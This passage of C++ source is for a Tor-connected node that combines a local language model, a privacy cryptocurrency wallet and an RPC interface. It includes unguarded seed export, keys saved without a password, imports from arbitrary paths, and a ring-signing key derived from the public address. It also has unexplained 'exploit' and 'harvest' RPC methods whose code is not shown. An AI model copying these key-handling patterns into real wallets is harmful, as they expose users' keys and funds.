            while ((ent = readdir(dir)) != nullptr) {
                std::string name = ent->d_name;
                if (name.size() > 5 && name.substr(name.size() - 5) == ".gguf") {
                    std::string full = modelsDir + "/" + name;
                    std::ifstream f(full, std::ios::ate | std::ios::binary);
                    if (f.good()) {
                        size_t sz = f.tellg();
                        if (sz > bestSize) { bestSize = sz; bestPath = full; }
                    }
                }
            }
            closedir(dir);
            if (!bestPath.empty() && bestSize > 1024 * 1024 && validateGguf(bestPath)) {
                size_t sl = bestPath.rfind('/');
                modelName_ = (sl != std::string::npos) ? bestPath.substr(sl + 1) : bestPath;
                modelPath_ = bestPath;
                modelSizeMb_ = bestSize / (1024 * 1024);
                modelLoaded_ = true;
            }
        }
    }

    applyDesktopConfig();
    generateTorrc();

    privacy_ = std::make_unique<synapse::privacy::PrivacyManager>();
    privacy_->init();
    privacy_->enablePrivacyMode(true);
    synapse::crypto::RingSign::loadKeyImages(dataDir_ + "/key_images.dat");
    ensureStealthWallet();
    loadMigratePrivateWallet();

    connectionType_ = "disconnected";
    sessionBootStop_.store(false);
    initialized_ = true;
    sessionBootThread_ = std::thread([this]() { bootTorMesh(); });
    return 0;
}

void SynapsedEngine::shutdown() {
    sessionBootStop_.store(true);
    blockFetchStop_.store(true);
    modelDownloadCancel();
    if (modelDlThread_.joinable()) modelDlThread_.join();
    stopSessionTor();
    if (sessionBootThread_.joinable()) sessionBootThread_.join();
    stopNaan();
    if (naanThread_.joinable()) naanThread_.join();
    stopListener();
    if (blockFetchThread_.joinable()) blockFetchThread_.join();
    if (peerProbeThread_.joinable()) peerProbeThread_.join();
    {
        std::lock_guard<std::mutex> llama(llamaMtx_);
        if (llamaEngine_) {
            llamaEngine_->shutdown();
            llamaEngine_.reset();
        }
        inferenceReady_ = false;
    }
    std::lock_guard<std::mutex> lock(mtx_);
    if (!initialized_) return;
    initialized_ = false;
    subscribers_.clear();
    nodeId_.clear();
    peerCount_ = 0;
    connectionType_ = "disconnected";
    modelLoaded_ = false;
}

bool SynapsedEngine::isInitialized() const {
    std::lock_guard<std::mutex> lock(mtx_);
    return initialized_;
}

std::string SynapsedEngine::rpcCall(const std::string& method, const std::string& paramsJson) {
  try {
    if (method == "naan.control") {
        return naanControl(paramsJson);
    }
    if (method == "model.catalog") {
        if (!isInitialized()) return "{\"error\":\"not initialized\"}";
        return modelCatalogJson();
    }
    if (method == "model.download") {
        if (!isInitialized()) return "{\"error\":\"not initialized\"}";
        return modelDownloadStart(paramsJson);
    }
    if (method == "model.download.status") {
        if (!isInitialized()) return "{\"error\":\"not initialized\"}";
        return modelDownloadStatusJson();
    }
    if (method == "model.download.cancel") {
        if (!isInitialized()) return "{\"error\":\"not initialized\"}";
        return modelDownloadCancel();
    }
    if (method == "model.load") {
        if (!isInitialized()) return "{\"error\":\"not initialized\"}";
        return modelLoad(paramsJson);
    }
    if (method == "model.unload") {
        if (!isInitialized()) return "{\"error\":\"not initialized\"}";
        return modelUnloadRpc();
    }
    if (method == "ai.complete") {
        if (!isInitialized()) return "{\"error\":\"not initialized\"}";
        return aiCompleteRpc(paramsJson);
    }
    if (method == "crypto.status") {
        if (!isInitialized()) return "{\"error\":\"not initialized\"}";
        return cryptoStatusJson();
    }
    if (method == "node.status") {
        if (!isInitialized()) return "{\"error\":\"not initialized\"}";
        return getStatus();
    }

    std::lock_guard<std::mutex> lock(mtx_);
    if (!initialized_) return "{\"error\":\"not initialized\"}";

    if (method == "node.peers") return "{\"peer_count\":" + std::to_string(peerCount_) + "}";
    if (method == "naan.status") return naanStatus();
    if (method == "model.status") return modelStatus();

    if (method == "wallet.info") {
        ensureStealthWallet();
        loadMigratePrivateWallet();
        std::string recv = stealthReceiveAddress();
        if (recv.empty()) recv = walletAddress_;
        nlohmann::json out;
        out["address"] = recv;
        out["identity"] = walletAddress_;
        out["balance"] = balance_;
        out["privacy"] = "stealth_ring11_ringct";
        return out.dump();
    }

    if (method == "wallet.create") {
        if (!walletMnemonic_.empty() && !walletAddress_.empty()) {
            ensureStealthWallet();
            loadMigratePrivateWallet();
            std::string recv = stealthReceiveAddress();
            if (recv.empty()) recv = walletAddress_;
            nlohmann::json existing;
            existing["address"] = recv;
            existing["seed"] = walletMnemonic_;
            existing["ok"] = true;
            existing["existing"] = true;
            return existing.dump();
        }
        crypto::Keys keys;
        keys.generate();
        walletMnemonic_ = keys.generateMnemonic(24);
        keys.fromMnemonic(walletMnemonic_);
        walletAddress_ = keys.getAddress();
        keys.save(dataDir_ + "/wallet.key", "");
        {
            std::ofstream mf(dataDir_ + "/wallet.mnemonic", std::ios::trunc);
            if (mf.good()) mf << walletMnemonic_;
        }
        ensureStealthWallet();
        loadMigratePrivateWallet();
        std::string recv = stealthReceiveAddress();
        if (recv.empty()) recv = walletAddress_;
        nlohmann::json out;
        out["address"] = recv;
        out["seed"] = walletMnemonic_;
        out["ok"] = true;
        return out.dump();
    }

    if (method == "wallet.seed") {
        return "{\"seed\":\"" + jsonEscape(walletMnemonic_) + "\"}";
    }

    if (method == "wallet.restore") {
        size_t seedPos = paramsJson.find("\"seed\"");
        if (seedPos != std::string::npos) {
            size_t q1 = paramsJson.find('"', seedPos + 6);
            size_t q2 = paramsJson.find('"', q1 + 1);
            if (q1 != std::string::npos && q2 != std::string::npos) {
                std::string mnemonic = paramsJson.substr(q1 + 1, q2 - q1 - 1);
                crypto::Keys keys;
                if (keys.fromMnemonic(mnemonic)) {
                    walletMnemonic_ = mnemonic;
                    walletAddress_ = keys.getAddress();
                    keys.save(dataDir_ + "/wallet.key", "");
                    {
                        std::ofstream mf(dataDir_ + "/wallet.mnemonic", std::ios::trunc);
                        if (mf.good()) mf << walletMnemonic_;
                    }
                    ensureStealthWallet();
                    loadMigratePrivateWallet();
                    std::string recv = stealthReceiveAddress();
                    if (recv.empty()) recv = walletAddress_;
                    return "{\"address\":\"" + jsonEscape(recv) + "\",\"ok\":true}";
                }
            }
        }
        return "{\"error\":\"invalid mnemonic\"}";
    }

    if (method == "wallet.export") {
        std::string path = dataDir_ + "/wallet_export.key";
        crypto::Keys keys;
        if (walletMnemonic_.empty() || !keys.fromMnemonic(walletMnemonic_))
            return "{\"error\":\"no mnemonic to export — restore 24 words first\"}";
        keys.save(path, "");
        return "{\"ok\":true,\"path\":\"" + jsonEscape(path) + "\"}";
    }

    if (method == "network.info") {
        auto ti = queryTorControl();
        probeSeedNodes();

        std::vector<PeerEntry> peersSnap;
        std::vector<PeerEntry> seedsSnap;
        {
            std::lock_guard<std::mutex> lock(peerCacheMtx_);
            peersSnap = cachedPeers_;
            seedsSnap = cachedSeeds_;
        }

        std::map<std::string, KnownPeer> knownSnap;
        {
            std::lock_guard<std::mutex> lock(knownPeersMtx_);
            knownSnap = knownPeers_;
        }
        const auto configuredSeeds = loadConfiguredSeeds(dataDir_);

        std::ostringstream ss;
        ss << "{\"peers\":[";
        int aliveCount = 0;
        size_t emitted = 0;
        int64_t nowInfo = nowMillis();
        std::set<std::string> emittedHosts;

        auto overlayKnown = [&](const std::string& host, std::string& alias, std::string& avatar,
                                int& latencyMs, bool& online) {
            auto it = knownSnap.find(host);
            if (it == knownSnap.end()) return;
            if (alias.empty()) alias = it->second.alias;
            if (avatar.empty()) avatar = it->second.avatar;
            if (latencyMs <= 0 && it->second.latency_ms > 0) latencyMs = it->second.latency_ms;
            if (it->second.connected) online = true;
        };

        auto emitPeer = [&](std::string address, std::string transport, int latencyMs,
                            std::string role, bool online, int64_t seenAgo, int64_t upMs,
                            std::string alias, std::string avatar) {
            const std::string host = onionHostOnly(address);
            if (host.empty() || emittedHosts.count(host)) return false;
            if (role != "YOU" && !ownOnion_.empty() && host == onionHostOnly(ownOnion_)) return false;
            if (role == "YOU") {
                alias = profileAlias_;
                avatar = profileAvatarDataUrl_;
            } else {
                overlayKnown(host, alias, avatar, latencyMs, online);
                // No nick and no photo = leftover onion, not a person on the map.
                if (alias.empty() && avatar.empty()) return false;
            }
            emittedHosts.insert(host);
            if (emitted > 0) ss << ",";
            ss << "{\"address\":\"" << jsonEscape(address)
               << "\",\"transport\":\"" << jsonEscape(transport)
               << "\",\"latency_ms\":" << latencyMs
               << ",\"online\":" << (online ? "true" : "false")
               << ",\"connected_since\":\"" << jsonEscape(role) << "\""
               << ",\"seen_ago_ms\":" << seenAgo
               << ",\"up_ms\":" << upMs
               << ",\"alias\":\"" << jsonEscape(alias)
               << "\",\"avatar\":\"" << jsonEscape(avatar) << "\"}";
            emitted++;
            if (online) aliveCount++;
            return true;
        };

        for (const auto& p : peersSnap) {
            if (p.role == "LOCAL" || p.role == "local") continue;
            int64_t seenAgo = p.alive ? 0 : -1;
            int64_t upMs = (p.alive && p.last_ok_ms > 0) ? (nowInfo - p.last_ok_ms) : 0;
            emitPeer(p.address, p.transport, p.latency_ms, p.role, p.alive, seenAgo, upMs,
                     p.alias, p.avatar);
        }
        // Alive SOCKS seeds belong on the map as remotes, not only in DIRECTORY.
        for (const auto& s : seedsSnap) {
            if (!s.alive) continue;
            int64_t upMs = (s.last_ok_ms > 0) ? (nowInfo - s.last_ok_ms) : 0;
            std::string role = (s.role == "SEED" || s.role.empty()) ? "PEER" : s.role;
            emitPeer(s.address, s.transport.empty() ? "tor" : s.transport, s.latency_ms,
                     role, true, 0, upMs, s.alias, s.avatar);
        }

        int meshPeers = 0;
        int64_t nowKnown = nowMillis();
        for (const auto& kv : knownSnap) {
            const auto& kp = kv.second;
            if (!ownOnion_.empty() && onionHostOnly(kp.onion) == onionHostOnly(ownOnion_)) continue;
            if (nowKnown - kp.lastSeen > 600000 && !kp.connected) continue;
            bool seedAlive = false;
            for (const auto& s : seedsSnap) {
                if (s.alive && onionHostOnly(s.address) == kp.onion) { seedAlive = true; break; }
            }
            if (!seedAlive && isConfiguredSeedHost(configuredSeeds, kp.onion) && kp.connected)
                seedAlive = true;
            bool peerOnline = kp.connected || seedAlive || (nowKnown - kp.lastSeen) < 90000;
            int64_t seenAgo = nowKnown - kp.lastSeen;
            int64_t upMs = (kp.firstSeen > 0) ? (nowKnown - kp.firstSeen) : 0;
            if (emitPeer(kp.onion + ":8333", "tor", kp.latency_ms, "PEER", peerOnline,
                         seenAgo, upMs, kp.alias, kp.avatar))
                meshPeers++;
        }
        peerCount_ = static_cast<int>(emitted);

        ss << "],\"own_onion\":\"" << jsonEscape(ownOnion_)
           << "\",\"hs_published\":" << (!ownOnion_.empty() ? "true" : "false")
           << ",\"hs_reachable\":" << (hsReachable_.load() ? "true" : "false")
           << ",\"socks_port\":" << sessionSocksPort_
           << ",\"listen_port\":" << listenPort_
           << ",\"tor\":{\"bootstrap\":\"" << jsonEscape(ti.bootstrap)
           << "\",\"circuits\":" << ti.circuits
           << ",\"bridge_status\":\"" << (ti.connected ? "active" : "none")
           << "\"},\"discovery\":{\"dns_queries\":0,\"peer_exchange\":" << meshPeers << "}"
           << ",\"bandwidth\":{\"inbound_kbps\":" << inboundKbps_
           << ",\"outbound_kbps\":" << outboundKbps_ << "}";
        {
            ss << ",\"seed_nodes\":[";
            for (size_t i = 0; i < configuredSeeds.size(); i++) {
                if (i) ss << ",";
                ss << "\"" << jsonEscape(configuredSeeds[i].host) << ":" << configuredSeeds[i].port << "\"";
            }
            ss << "],\"seeds\":[";
            for (size_t i = 0; i < seedsSnap.size(); i++) {
                if (i) ss << ",";
                const auto& s = seedsSnap[i];
                ss << "{\"address\":\"" << jsonEscape(s.address)
                   << "\",\"online\":" << (s.alive ? "true" : "false")
                   << ",\"latency_ms\":" << s.latency_ms << "}";
            }
            ss << "]";
        }
        ss << ",\"profile\":{\"alias\":\"" << jsonEscape(profileAlias_)
           << "\",\"avatar\":\"" << jsonEscape(profileAvatarDataUrl_) << "\"}";
        ss << "}";
        return ss.str();
    }

    if (method == "network.peer.dial") {
        nlohmann::json p;
        try {
            p = nlohmann::json::parse(paramsJson.empty() ? "{}" : paramsJson);
        } catch (...) {
            return "{\"error\":\"bad json\"}";
        }
        std::string onion = onionHostOnly(trimSeedToken(p.value("onion", "")));
        if (!isValidV3Onion(onion)) return "{\"error\":\"need a v3 onion\"}";
        if (!ownOnion_.empty() && onion == ownOnion_)
            return "{\"error\":\"that is this session\"}";
        auto learned = dialPeer(onion);
        nlohmann::json out;
        out["ok"] = true;
        out["onion"] = onion;
        out["learned"] = learned;
        {
            std::lock_guard<std::mutex> lock(knownPeersMtx_);
            auto it = knownPeers_.find(onion);
            out["online"] = it != knownPeers_.end() && it->second.connected;
            out["latency_ms"] = it != knownPeers_.end() ? it->second.latency_ms : -1;
        }
        return out.dump();
    }

    if (method == "network.seeds.set") {
        nlohmann::json p;
        try {
            p = nlohmann::json::parse(paramsJson.empty() ? "{}" : paramsJson);
        } catch (...) {
            return "{\"error\":\"bad json\"}";
        }
        std::string csv = p.value("seed_nodes", "");
        if (csv.empty() && p.contains("seeds") && p["seeds"].is_array()) {
            std::ostringstream os;
            size_t n = 0;
            for (const auto& s : p["seeds"]) {
                if (!s.is_string()) continue;
                if (n++) os << ",";
                os << s.get<std::string>();
            }
            csv = os.str();
        }
        auto parsed = parseSeedEndpoints(csv);
        std::ostringstream os;
        for (size_t i = 0; i < parsed.size(); i++) {
            if (i) os << ",";
            os << parsed[i].host << ":" << parsed[i].port;
        }
        if (!writeConfiguredSeeds(dataDir_, os.str()))
            return "{\"error\":\"failed to write synapsenet.conf\"}";
        lastPeerProbe_ = 0;
        {
            std::lock_guard<std::mutex> lock(peerCacheMtx_);
            cachedPeers_.clear();
            cachedSeeds_.clear();
        }
        probeSeedNodes();
        return std::string("{\"ok\":true,\"seed_nodes\":\"") + jsonEscape(os.str()) + "\"}";
    }

    if (method == "exploit.list") {
        int offset = 0, limit = 100;
        size_t offP = paramsJson.find("\"offset\"");
        if (offP != std::string::npos) {
            size_t colon = paramsJson.find(':', offP);
            if (colon != std::string::npos) offset = std::atoi(paramsJson.c_str() + colon + 1);
        }
        size_t limP = paramsJson.find("\"limit\"");
        if (limP != std::string::npos) {
            size_t colon = paramsJson.find(':', limP);
            if (colon != std::string::npos) limit = std::atoi(paramsJson.c_str() + colon + 1);
        }
        return exploitChainList(offset, limit);
    }
    if (method == "exploit.stats") return exploitChainStats();
    if (method == "exploit.sync") {
        syncExploitChainFromPeers();
        return "{\"ok\":true,\"count\":" + std::to_string(exploitChain_.size()) + "}";
    }
    if (method == "harvest.list") {
        int offset = 0, limit = 50;
        size_t offP = paramsJson.find("\"offset\"");
        if (offP != std::string::npos) {
            size_t colon = paramsJson.find(':', offP);
            if (colon != std::string::npos) offset = std::atoi(paramsJson.c_str() + colon + 1);
        }
        size_t limP = paramsJson.find("\"limit\"");
        if (limP != std::string::npos) {
            size_t colon = paramsJson.find(':', limP);
            if (colon != std::string::npos) limit = std::atoi(paramsJson.c_str() + colon + 1);
        }
        if (limit <= 0) limit = 50;
        if (limit > 200) limit = 200;
        return harvestList(offset, limit);
    }
    if (method == "harvest.get") {
        size_t q1 = paramsJson.find("\"sha256\"");
        if (q1 == std::string::npos) return "{\"error\":\"missing sha256\"}";
        size_t vs = paramsJson.find('"', q1 + 8);
        size_t ve = paramsJson.find('"', vs + 1);
        if (vs == std::string::npos || ve == std::string::npos) return "{\"error\":\"bad json\"}";
        return harvestGet(paramsJson.substr(vs + 1, ve - vs - 1));
    }

    if (method == "blocks.list") {
        std::vector<std::string> lines;
        int totalEvents = 0;
        {
            std::ifstream bf(dataDir_ + "/blocks.jsonl");
            if (bf.good()) {
                std::string line;
                while (std::getline(bf, line)) {
                    if (!line.empty()) lines.push_back(line);
                }
            }
        }
        for (auto& l : lines) {
            size_t ep = l.find("\"events\":");
            if (ep != std::string::npos) totalEvents += std::atoi(l.c_str() + ep + 9);
        }
        uint64_t height = lines.empty() ? 0 : (uint64_t)lines.size();
        int avgEvt = lines.empty() ? 0 : (totalEvents / (int)lines.size());

        std::ostringstream ss;
        ss << "{\"height\":" << height
           << ",\"total_events\":" << totalEvents
           << ",\"avg_events_per_block\":" << avgEvt
           << ",\"blocks\":[";

        {
            int start = lines.size() > 50 ? static_cast<int>(lines.size()) - 50 : 0;
            for (int i = static_cast<int>(lines.size()) - 1; i >= start; i--) {
                if (i < static_cast<int>(lines.size()) - 1) ss << ",";
                ss << lines[i];
            }
        }
        ss << "],\"producers\":[";
        {
            std::unordered_map<std::string, std::pair<int, int64_t>> prodMap;
            for (auto& line : lines) {
                size_t pp = line.find("\"producer\":\"");
                if (pp == std::string::npos) continue;
                size_t ps = pp + 12;
                size_t pe = line.find('"', ps);
                if (pe == std::string::npos) continue;
                std::string prod = line.substr(ps, pe - ps);
                size_t tp = line.find("\"timestamp\":");
                int64_t ts = 0;
                if (tp != std::string::npos) ts = std::atoll(line.c_str() + tp + 12);
                auto& entry = prodMap[prod];
                entry.first++;
                if (ts > entry.second) entry.second = ts;
            }
            int pi = 0;
            for (auto& kv : prodMap) {
                if (pi > 0) ss << ",";
                ss << "{\"address\":\"" << jsonEscape(kv.first)
                   << "\",\"blocks\":" << kv.second.first
                   << ",\"last_block\":" << kv.second.second << "}";
                pi++;
            }
        }
        ss << "]}";
        return ss.str();
    }

    if (method == "blocks.get") {
        size_t hp = paramsJson.find("\"height\"");
        if (hp == std::string::npos) return "{\"error\":\"missing height\"}";
        size_t colon = paramsJson.find(':', hp);
        if (colon == std::string::npos) return "{\"error\":\"bad json\"}";
        int targetH = std::atoi(paramsJson.c_str() + colon + 1);

        auto searchFile = [&](const std::string& path, std::string& lastHit) {
            std::ifstream bf(path);
            if (!bf.good()) return;
            std::string line;
            while (std::getline(bf, line)) {
                if (line.empty()) continue;
                size_t hPos = line.find("\"height\":");
                if (hPos == std::string::npos) continue;
                int h = std::atoi(line.c_str() + hPos + 9);
                if (h != targetH) continue;
                size_t edPos = line.find("\"events_detail\":");
                if (edPos != std::string::npos) {
                    std::string before = line.substr(0, edPos);
                    std::string after = line.substr(edPos + 16);
                    lastHit = before + "\"events\":" + after;
                } else {
                    lastHit = line;
                }
            }
        };
        std::string result;
        searchFile(dataDir_ + "/blocks.jsonl", result);
        if (!result.empty()) return result;
        return "{\"error\":\"block not found\"}";
    }

    if (method == "wallet.import") {
        size_t pp = paramsJson.find("\"path\"");
        if (pp == std::string::npos) return "{\"error\":\"missing path\"}";
        size_t q1 = paramsJson.find('"', pp + 6);
        size_t q2 = paramsJson.find('"', q1 + 1);
        if (q1 == std::string::npos || q2 == std::string::npos) return "{\"error\":\"bad json\"}";
        std::string importPath = paramsJson.substr(q1 + 1, q2 - q1 - 1);
        crypto::Keys keys;
        if (keys.load(importPath, "")) {
            walletMnemonic_ = keys.toMnemonic();
            walletAddress_ = keys.getAddress();
            keys.save(dataDir_ + "/wallet.key", "");
            if (!walletMnemonic_.empty()) {
                std::ofstream mf(dataDir_ + "/wallet.mnemonic", std::ios::trunc);
                if (mf.good()) mf << walletMnemonic_;
                ensureStealthWallet();
                loadMigratePrivateWallet();
            }
            std::string recv = stealthReceiveAddress();
            if (recv.empty()) recv = walletAddress_;
            return "{\"ok\":true,\"address\":\"" + jsonEscape(recv) +
                   "\",\"has_mnemonic\":" + std::string(walletMnemonic_.empty() ? "false" : "true") + "}";
        }
        return "{\"error\":\"failed to import wallet file\"}";
    }

    if (method == "transfer.send" || method == "privacy.stealth.send") {
        try {
            size_t rp = paramsJson.find("\"recipient\"");
            size_t ap = paramsJson.find("\"amount\"");
            if (rp == std::string::npos || ap == std::string::npos)
                return "{\"error\":\"recipient and amount required\"}";
            size_t rq1 = paramsJson.find('"', rp + 11);
            size_t rq2 = (rq1 == std::string::npos) ? std::string::npos : paramsJson.find('"', rq1 + 1);
            size_t aq1 = paramsJson.find('"', ap + 8);
            size_t aq2 = (aq1 == std::string::npos) ? std::string::npos : paramsJson.find('"', aq1 + 1);
            if (rq1 == std::string::npos || rq2 == std::string::npos ||
                aq1 == std::string::npos || aq2 == std::string::npos)
                return "{\"error\":\"bad json\"}";
            std::string recipient = paramsJson.substr(rq1 + 1, rq2 - rq1 - 1);
            double amt = std::atof(paramsJson.substr(aq1 + 1, aq2 - aq1 - 1).c_str());
            if (amt <= 0) return "{\"error\":\"invalid amount\"}";
            std::string memo;
            size_t mp = paramsJson.find("\"memo\"");
            if (mp != std::string::npos) {
                size_t mq1 = paramsJson.find('"', mp + 6);
                size_t mq2 = (mq1 == std::string::npos) ? std::string::npos : paramsJson.find('"', mq1 + 1);
                if (mq1 != std::string::npos && mq2 != std::string::npos)
                    memo = paramsJson.substr(mq1 + 1, mq2 - mq1 - 1);
            }
            return sendPrivateNgt(recipient, amt, memo);
        } catch (const std::exception& e) {
            return std::string("{\"error\":\"") + jsonEscape(e.what()) + "\"}";
        } catch (...) {
            return "{\"error\":\"transfer failed\"}";
        }
    }

    if (method == "privacy.status") {
        nlohmann::json out;
        out["stealth_enabled"] = true;
        out["ring_enabled"] = true;
        out["confidential_enabled"] = true;
        out["transparent_send"] = false;
        out["ring_size"] = synapse::privacy::kPrivateRingSize;
        out["version"] = "stealth_ring11_ringct_v2";
        out["stealth_protocol"] = "ed25519_ecdh";
        out["ring_protocol"] = "mlsag2_ringct_ed25519";
        out["ct_protocol"] = "pedersen_ed25519_range64";
        out["bulletproofs"] = false;
        out["not_monero"] = true;
        out["honest"] = "stealth+mlsag2+range64+tor; not bulletproofs; mining rewards are ringct coinbase";
        return out.dump();
    }

    if (method == "privacy.stealth.generate") {
        if (!privacy_) return "{\"error\":\"privacy not initialized\"}";
        try {
            ensureStealthWallet();
            synapse::privacy::StealthAddress& sa = privacy_->stealth();
            if (!sa.hasKeys() && !sa.generateKeys()) return "{\"error\":\"key generation failed\"}";
            nlohmann::json out;
            out["view_pub"] = synapse::crypto::toHex(sa.getViewPublicKey());
            out["spend_pub"] = synapse::crypto::toHex(sa.getSpendPublicKey());
            out["address"] = sa.encodeAddress();
            return out.dump();
        } catch (const std::exception& e) {
            return std::string("{\"error\":\"") + jsonEscape(e.what()) + "\"}";
        } catch (...) {
            return "{\"error\":\"stealth generate failed\"}";
        }
    }

    if (method == "privacy.tx.import") {
        try {
            ingestPrivateTxJson(paramsJson);
            return "{\"ok\":true}";
        } catch (const std::exception& e) {
            return std::string("{\"error\":\"") + jsonEscape(e.what()) + "\"}";
        } catch (...) {
            return "{\"error\":\"import failed\"}";
        }
    }

    if (method == "privacy.ring.sign") {
        try {
            size_t mp = paramsJson.find("\"message\"");
            if (mp == std::string::npos) return "{\"error\":\"message required\"}";
            size_t mq1 = paramsJson.find('"', mp + 9);
            size_t mq2 = (mq1 == std::string::npos) ? std::string::npos : paramsJson.find('"', mq1 + 1);
            if (mq1 == std::string::npos || mq2 == std::string::npos)
                return "{\"error\":\"bad json\"}";
            std::string message = paramsJson.substr(mq1 + 1, mq2 - mq1 - 1);
            std::vector<uint8_t> msgBytes(message.begin(), message.end());
            std::vector<uint8_t> privScalar = scalarFromSeed(walletAddress_ + ":ring_signer");
            std::vector<uint8_t> signerPub = pointFromScalar(privScalar);
            std::string signerPubHex = synapse::crypto::toHex(signerPub);

            std::vector<std::vector<uint8_t>> pool;
            {
                std::set<std::string> seen;
                std::ifstream hf(dataDir_ + "/tx_history.jsonl");
                std::string line;
                while (hf.good() && std::getline(hf, line) && pool.size() < 20) {
                    size_t kp = line.find("\"one_time_address\"");
                    while (kp != std::string::npos && pool.size() < 20) {
                        size_t q1 = line.find('"', kp + 18);
                        size_t q2 = (q1 == std::string::npos) ? std::string::npos : line.find('"', q1 + 1);
                        if (q1 == std::string::npos || q2 == std::string::npos) break;
                        std::string hex = line.substr(q1 + 1, q2 - q1 - 1);
                        kp = line.find("\"one_time_address\"", q2);
                        if (hex.size() != crypto_core_ed25519_BYTES * 2) continue;
                        if (hex == signerPubHex) continue;
                        if (seen.count(hex)) continue;
                        std::vector<uint8_t> pt = synapse::crypto::fromHex(hex);
                        if (pt.size() != crypto_core_ed25519_BYTES) continue;
                        if (crypto_core_ed25519_is_valid_point(pt.data()) != 1) continue;
                        seen.insert(hex);
                        pool.push_back(pt);
                    }
                }
            }

            std::vector<std::vector<uint8_t>> decoys;
            std::set<size_t> usedIdx;
            while (decoys.size() < 3 && usedIdx.size() < pool.size()) {
                std::vector<uint8_t> rb = synapse::crypto::randomBytes(4);
                uint32_t r = static_cast<uint32_t>(rb[0]) |
                             (static_cast<uint32_t>(rb[1]) << 8) |
                             (static_cast<uint32_t>(rb[2]) << 16) |
                             (static_cast<uint32_t>(rb[3]) << 24);
                size_t idx = r % pool.size();
                if (usedIdx.count(idx)) continue;
                usedIdx.insert(idx);
                decoys.push_back(pool[idx]);
            }
            for (int i = decoys.size(); i < 3; ++i) {
                std::vector<uint8_t> ds = scalarFromSeed(message + ":decoy:" + std::to_string(i));
                decoys.push_back(pointFromScalar(ds));
            }

            std::vector<std::vector<uint8_t>> ring;
            ring.push_back(signerPub);
            for (const auto& d : decoys) ring.push_back(d);

            size_t signerIndex = 0;
            {
                std::vector<uint8_t> rb = synapse::crypto::randomBytes(1);
                size_t target = static_cast<size_t>(rb[0]) % ring.size();
                std::swap(ring[signerIndex], ring[target]);
                signerIndex = target;
            }

            synapse::crypto::RingSignature sig = synapse::crypto::RingSign::sign(
                msgBytes, ring, privScalar, signerIndex);
            synapse::crypto::RingSign::saveKeyImages(dataDir_ + "/key_images.dat");
            std::vector<uint8_t> serialized = sig.serialize();
            nlohmann::json out;
            out["ok"] = true;
            out["signature"] = synapse::crypto::toHex(serialized);
            nlohmann::json ringHex = nlohmann::json::array();
            for (const auto& k : ring) ringHex.push_back(synapse::crypto::toHex(k));
            out["ring"] = ringHex;
            out["key_image"] = synapse::crypto::toHex(sig.keyImage);
            return out.dump();
        } catch (const std::exception& e) {
            return std::string("{\"error\":\"") + jsonEscape(e.what()) + "\"}";
        } catch (...) {
            return "{\"error\":\"ring sign failed\"}";
        }
    }

    if (method == "privacy.ring.verify") {
        try {
            nlohmann::json params = nlohmann::json::parse(paramsJson, nullptr, false);
            if (params.is_discarded()) return "{\"error\":\"bad json\"}";
            if (!params.contains("message") || !params.contains("signature") || !params.contains("ring"))
                return "{\"error\":\"message, signature and ring required\"}";
            std::string message = params["message"].get<std::string>();
            std::string sigHex = params["signature"].get<std::string>();
            std::vector<uint8_t> msgBytes(message.begin(), message.end());
            std::vector<uint8_t> serialized = synapse::crypto::fromHex(sigHex);
            synapse::crypto::RingSignature sig = synapse::crypto::RingSignature::deserialize(serialized);
            std::vector<std::vector<uint8_t>> ring;
            for (const auto& el : params["ring"]) {
                ring.push_back(synapse::crypto::fromHex(el.get<std::string>()));
            }
            bool valid = synapse::crypto::RingSign::verify(msgBytes, ring, sig);
            nlohmann::json out;
            out["valid"] = valid;
            return out.dump();
        } catch (const std::exception& e) {
            return std::string("{\"error\":\"") + jsonEscape(e.what()) + "\"}";
        } catch (...) {
            return "{\"error\":\"ring verify failed\"}";
        }
    }

    if (method == "privacy.view.scan") {
        try {
            nlohmann::json params = nlohmann::json::parse(paramsJson, nullptr, false);
            if (params.is_discarded()) return "{\"error\":\"bad json\"}";
            if (!params.contains("view_priv") || !params.contains("spend_pub"))
                return "{\"error\":\"view_priv and spend_pub required\"}";
            std::vector<uint8_t> viewPriv = synapse::crypto::fromHex(params["view_priv"].get<std::string>());
            std::vector<uint8_t> spendPub = synapse::crypto::fromHex(params["spend_pub"].get<std::string>());
            if (viewPriv.size() != crypto_core_ed25519_SCALARBYTES)
                return "{\"error\":\"view_priv must be a 32 byte scalar\"}";
            if (spendPub.size() != crypto_core_ed25519_BYTES)
                return "{\"error\":\"spend_pub must be a 32 byte point\"}";

            nlohmann::json owned = nlohmann::json::array();
            std::ifstream hf(dataDir_ + "/tx_history.jsonl");
            std::string line;
            while (hf.good() && std::getline(hf, line)) {
                size_t ep = line.find("\"ephemeral_pub\"");
                size_t op = line.find("\"one_time_address\"");
                if (ep == std::string::npos || op == std::string::npos) continue;
                size_t eq1 = line.find('"', ep + 15);
                size_t eq2 = (eq1 == std::string::npos) ? std::string::npos : line.find('"', eq1 + 1);
                size_t oq1 = line.find('"', op + 18);
                size_t oq2 = (oq1 == std::string::npos) ? std::string::npos : line.find('"', oq1 + 1);
                if (eq1 == std::string::npos || eq2 == std::string::npos ||
                    oq1 == std::string::npos || oq2 == std::string::npos) continue;
                std::string ephHex = line.substr(eq1 + 1, eq2 - eq1 - 1);
                std::string oneHex = line.substr(oq1 + 1, oq2 - oq1 - 1);
                std::vector<uint8_t> ephPub = synapse::crypto::fromHex(ephHex);
                std::vector<uint8_t> oneTime = synapse::crypto::fromHex(oneHex);
                if (ephPub.size() != crypto_core_ed25519_BYTES ||
                    oneTime.size() != crypto_core_ed25519_BYTES) continue;
                if (crypto_core_ed25519_is_valid_point(ephPub.data()) != 1) continue;

                std::vector<uint8_t> shared(crypto_core_ed25519_BYTES);
                if (crypto_scalarmult_ed25519_noclamp(shared.data(), viewPriv.data(), ephPub.data()) != 0)
                    continue;
                std::vector<uint8_t> firstHash(crypto_hash_sha256_BYTES);
                crypto_hash_sha256(firstHash.data(), shared.data(), shared.size());
                std::vector<uint8_t> secondHash(crypto_hash_sha256_BYTES);
                crypto_hash_sha256(secondHash.data(), firstHash.data(), firstHash.size());
                std::vector<uint8_t> wide(crypto_core_ed25519_NONREDUCEDSCALARBYTES);
                std::memcpy(wide.data(), firstHash.data(), crypto_hash_sha256_BYTES);
                std::memcpy(wide.data() + crypto_hash_sha256_BYTES, secondHash.data(), crypto_hash_sha256_BYTES);
                std::vector<uint8_t> scalar(crypto_core_ed25519_SCALARBYTES);
                crypto_core_ed25519_scalar_reduce(scalar.data(), wide.data());
                std::vector<uint8_t> hG(crypto_core_ed25519_BYTES);
                if (crypto_scalarmult_ed25519_base_noclamp(hG.data(), scalar.data()) != 0)
                    continue;
